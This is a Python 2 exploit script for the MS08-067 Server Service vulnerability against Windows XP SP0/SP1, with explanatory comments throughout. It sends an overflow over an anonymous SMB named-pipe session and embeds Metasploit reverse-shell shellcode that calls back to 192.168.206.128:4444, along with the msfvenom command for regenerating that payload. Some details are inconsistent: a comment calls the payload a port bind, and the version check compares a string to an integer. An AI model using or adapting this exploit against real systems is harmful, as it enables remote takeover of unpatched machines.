#!/usr/bin/env python
#############################################################################
#   MS08-067 Exploit by Evie Andrew
#   https://github.com/evievsbrain/
#############################################################################

# BASED ON:
#############################################################################
#   MS08-067 Exploit by Debasis Mohanty (aka Tr0y/nopsled)
#   www.hackingspirits.com
#   www.coffeeandsecurity.com
#   Email: d3basis.m0hanty @ gmail.com
#############################################################################

from threading import Thread
import sys

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport
    from impacket.structure import Structure
    from impacket.dcerpc import ndrutils
    from impacket.dcerpc.v5 import ndr
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)

print 'This is a python exploit for MS08_067 based on the same exploit by Debasis Mohanty,'
print 'arguably improved using the Metasploit ruby exploit MS08_067_netapi.rb as a reference.'
print 'This designed specifically to target Windows XP SP0 and SP1.'

# This is a template which describes the MSRPC stub for NetprPathCanonicalize() in NetAPI32.dll.
# Directly adapted from the example within impacket, the stub for NetprNameCanonicalize, in srvsvc.py
# which is very similar.
# 'w' seems to represent 'wide' character, or unicode string representation.
# '<H' seems to stand for little endian long unsigned integer.
# 'opnum' is the operation number of NetprPathCanonicalize within the Server Service RPC interface.
# 'alignment' seems to refer to the concept of byte alignment, forcing the binary representation of
# parameters into a 4 byte grid.
# ('RefID','<L&ServerName') is present in all stubs, anyones' guess what this is would be just as good as mine.


class NetprPathCanonicalize(Structure):
    opnum = 31
    alignment = 4
    structure = (
        ('RefID', '<L&ServerName'),
        ('ServerName', 'w'),
        ('PathName', 'w'),
        ('OutbufLen', '<H'),
        ('Prefix', 'w'),
        ('PathType', '<H'),
        ('Flags', '<H')
    )


# This is the shellcode generated by metasploit. It will need to be changed for every
# application due to the fact that it incorporates the return ip address within the encoded
# payload. The code to generate is:
# msfvenom --payload windows/shell_reverse_tcp --nopsled 7 LHOST=<your.ip.address.here> ...
# EXITFUNC=thread --bad-chars "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -e x86/jmp_call_additive

# Portbind shellcode from metasploit; Binds port to TCP port 4444
# windows/shell_reverse_tcp - 360 bytes
# http://www.metasploit.com
# Encoder: x86/jmp_call_additive
# NOP gen: x86/single_byte
# VERBOSE=false, LHOST=192.168.206.128, LPORT=4444, 
# ReverseAllowProxy=false, ReverseConnectRetries=5, 
# ReverseListenerThreaded=false, PrependMigrate=false, 
# EXITFUNC=thread, InitialAutoRunScript=, AutoRunScript=
buf =  ""
buf += "\x9b\x56\x4d\x43\x5b\x42\x97\xfc\xbb\x87\xf9\xf5\xe0"
buf += "\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7"
buf += "\xc3\xe8\xef\xff\xff\xff\x7b\x11\x77\xe0\x83\xe2\x18"
buf += "\x68\x66\xd3\x18\x0e\xe3\x44\xa9\x44\xa1\x68\x42\x08"
buf += "\x51\xfa\x26\x85\x56\x4b\x8c\xf3\x59\x4c\xbd\xc0\xf8"
buf += "\xce\xbc\x14\xda\xef\x0e\x69\x1b\x37\x72\x80\x49\xe0"
buf += "\xf8\x37\x7d\x85\xb5\x8b\xf6\xd5\x58\x8c\xeb\xae\x5b"
buf += "\xbd\xba\xa5\x05\x1d\x3d\x69\x3e\x14\x25\x6e\x7b\xee"
buf += "\xde\x44\xf7\xf1\x36\x95\xf8\x5e\x77\x19\x0b\x9e\xb0"
buf += "\x9e\xf4\xd5\xc8\xdc\x89\xed\x0f\x9e\x55\x7b\x8b\x38"
buf += "\x1d\xdb\x77\xb8\xf2\xba\xfc\xb6\xbf\xc9\x5a\xdb\x3e"
buf += "\x1d\xd1\xe7\xcb\xa0\x35\x6e\x8f\x86\x91\x2a\x4b\xa6"
buf += "\x80\x96\x3a\xd7\xd2\x78\xe2\x7d\x99\x95\xf7\x0f\xc0"
buf += "\xf1\x34\x22\xfa\x01\x53\x35\x89\x33\xfc\xed\x05\x78"
buf += "\x75\x28\xd2\x7f\xac\x8c\x4c\x7e\x4f\xed\x45\x45\x1b"
buf += "\xbd\xfd\x6c\x24\x56\xfd\x91\xf1\xf9\xad\x3d\xaa\xb9"
buf += "\x1d\xfe\x1a\x52\x77\xf1\x45\x42\x78\xdb\xed\xe9\x83"
buf += "\x8c\xd1\x46\x45\xcc\xba\x94\x59\xdc\x66\x10\xbf\xb4"
buf += "\x86\x74\x68\x21\x3e\xdd\xe2\xd0\xbf\xcb\x8f\xd3\x34"
buf += "\xf8\x70\x9d\xbc\x75\x62\x4a\x4d\xc0\xd8\xdd\x52\xfe"
buf += "\x74\x81\xc1\x65\x84\xcc\xf9\x31\xd3\x99\xcc\x4b\xb1"
buf += "\x37\x76\xe2\xa7\xc5\xee\xcd\x63\x12\xd3\xd0\x6a\xd7"
buf += "\x6f\xf7\x7c\x21\x6f\xb3\x28\xfd\x26\x6d\x86\xbb\x90"
buf += "\xdf\x70\x12\x4e\xb6\x14\xe3\xbc\x09\x62\xec\xe8\xff"
buf += "\x8a\x5d\x45\x46\xb5\x52\x01\x4e\xce\x8e\xb1\xb1\x05"
buf += "\x0b\xd1\x53\x8f\x66\x7a\xca\x5a\xcb\xe7\xed\xb1\x08"
buf += "\x1e\x6e\x33\xf1\xe5\x6e\x36\xf4\xa2\x28\xab\x84\xbb"
buf += "\xdc\xcb\x3b\xbb\xf4\xcb\xbb\x43\xf7"
shellcode = buf


class SRVSVC_Exploit(Thread):
    def __init__(self, target, osver, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port = port
        self.target = target
        self.osver = osver
    
    # This is where the smb connection is made, the MSRPC bind is created, and the payload is built.
    def __DCEPacket(self):
        print '[-]Initiating connection'

        # Establishes all of the information required to make an MSRPC connection to our named pipe endpoint.
        # ncacn_np is the chosen transport, the named pipe transport.
        # \pipe\browser is an ideal target. It is an alias for ntsvc, so gives us access to the Server Service
        # and is the most likely to have null session access priveleges.
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        # No username or password for anonymous connections (NULL Sessions) if you are targeting
        # later Windows OSs, or a particularly conscientious sysadmin, you will need credentials.
        # This is due to the fact null sessions are allocated write priveleges to named pipes based
        # on registry values, which allow null session access by default on early OSs.
        self.__username = ''
        self.__password = ''
        self.__domain = 'WORKGROUP'  # domain, IMPORTANT: replace with the name of the domain of your target.
        self.__lmhash = ''
        self.__nthash = ''

        # connect to the chosen named pipe, with a null session, ready to choose an interface.
        self.__trans.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        # chooses the srvsvc, or Server Service RPC interface via the interface UUID and the interface version number.
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        
        # the address of the Call EDI instruction required to initiate the jumper code, note that it is
        # written backwards due to the endianness of addresses in intel x86. The actual address is
        # represented as 0x001f1cb0.
        ret_substitute = '\xb0\x1c\x1f\x00'
        # This is called the 'scratch' address in the metasploit code, I'm not entirely sure what it's for. Rather than
        # simply making an educated guess, I'll leave it as a subject in future work.
        scratch = '\x08\x04\x02\x00'

        # Constructing Malicious Packet, I have left all nops (\x90) and padding (\x41 and \x42) as is simply
        # for readability. If this offends you, then feel free to change it.
        self.__stub = '\x5c\x00'
        self.__stub += '\x42'*100  # padding
        self.__stub += shellcode
        self.__stub += '\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00'  # \..\..\
        self.__stub += '\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00'  # unicode padding
        self.__stub += scratch
        self.__stub += ret_substitute
        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub += '\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x5a'  # nops and jump to shellcode
        self.__stub += '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41'
        self.__stub += '\x00\x00'
        
        # Instanciate the NetprPathCanonicalize RPC stub class defined above, provide each of the parameters
        # as described by the stub definition. The internal workings of Impacket will handle the actual marshalling.
        self.query = NetprPathCanonicalize()        
        self.query['ServerName'] = "ABCDEF\x00".encode('utf-16le')
        self.query['PathName'] = self.__stub
        self.query['OutbufLen'] = 60
        self.query['Prefix'] = "\\\x00".encode('utf-16le')
        self.query['PathType'] = 4096
        self.query['Flags'] = 0x0
        return
    
    # DCEpacket builds the payload and initiates the connection, and the call function sends the generated
    # payload along with the operation number 31.
    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.query)  # 0x1f (or 31)- NetPathCanonicalize Operation


def usage(program_name):
    print '\nUsage: %s <target ip> <os version>\n' % program_name
    print 'Example: srvsvcexpl.py 192.168.1.1 2\n'
    print 'Select OS Version'
    print '[-]Windows XP SP 0 and 1: OS Version = 1'


if __name__ == '__main__':
    try:
        target = sys.argv[1]
        osver = sys.argv[2]
        if osver == 1:
            current = SRVSVC_Exploit(target, osver)
            current.start()
        else:
            usage(sys.argv[0])
    except Exception as e:
        usage(sys.argv[0])

    sys.exit(-1)
